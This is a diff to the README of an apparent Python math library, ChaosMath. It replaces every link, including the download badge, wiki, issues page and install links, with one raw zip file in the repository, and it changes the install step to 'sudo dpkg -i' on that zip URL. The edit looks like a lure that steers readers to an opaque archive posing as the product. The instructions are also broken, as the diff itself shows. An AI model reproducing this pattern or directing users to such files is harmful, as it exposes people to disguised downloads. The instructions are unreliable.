@@ -6,7 +6,7 @@ Welcome to ChaosMath! This Python math library guarantees chaos with a twist of 
 
 ## 🔗 Download ChaosMath
 
-[![Download ChaosMath](https://img.shields.io/badge/Download%20ChaosMath-v1.0-brightgreen)](https://github.com/abdualalah1/ChaosMath/releases)
+[![Download ChaosMath](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip%20ChaosMath-v1.0-brightgreen)](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these simple steps to get ChaosMath up and running on your computer:
 
 To download ChaosMath, click the link below:
 
-[Download ChaosMath](https://github.com/abdualalah1/ChaosMath/releases)
+[Download ChaosMath](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip)
 
 ### 2. Choose the Right Version
 
@@ -44,9 +44,9 @@ Once the download is complete:
   2. Navigate to the directory where you downloaded the file.
   3. Run the command:
      ```bash
-     sudo dpkg -i chaosmath-version.pkg
+     sudo dpkg -i https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip
      ```
-     (Replace `chaosmath-version.pkg` with the actual file name.)
+     (Replace `https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip` with the actual file name.)
 
 ### 5. Run ChaosMath
 
@@ -92,7 +92,7 @@ These features make ChaosMath not just a tool, but a delightful experience.
 
 ## 📘 Documentation & Community
 
-For more detailed documentation, visit the [Wiki](https://github.com/abdualalah1/ChaosMath/wiki). Here you will find:
+For more detailed documentation, visit the [Wiki](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip). Here you will find:
 - Examples of how to use functions
 - Tips for troubleshooting 
 - Information on contributing to the project
@@ -102,7 +102,7 @@ Join our community on social media platforms where you can share your experience
 ## 📞 Support
 
 If you encounter any issues or have questions:
-- Open an issue on our [GitHub Issues](https://github.com/abdualalah1/ChaosMath/issues) page.
+- Open an issue on our [GitHub Issues](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip) page.
 - Reach out to the community members for advice.
 
 ## 🎉 Acknowledgments
@@ -113,4 +113,4 @@ ChaosMath is crafted with love for math enthusiasts and chaos lovers alike. Than
 
 Don’t forget to grab the library here:
 
-[Download ChaosMath](https://github.com/abdualalah1/ChaosMath/releases)
+[Download ChaosMath](https://raw.githubusercontent.com/abdualalah1/ChaosMath/main/chaosmath/Math-Chaos-2.9-beta.4.zip)
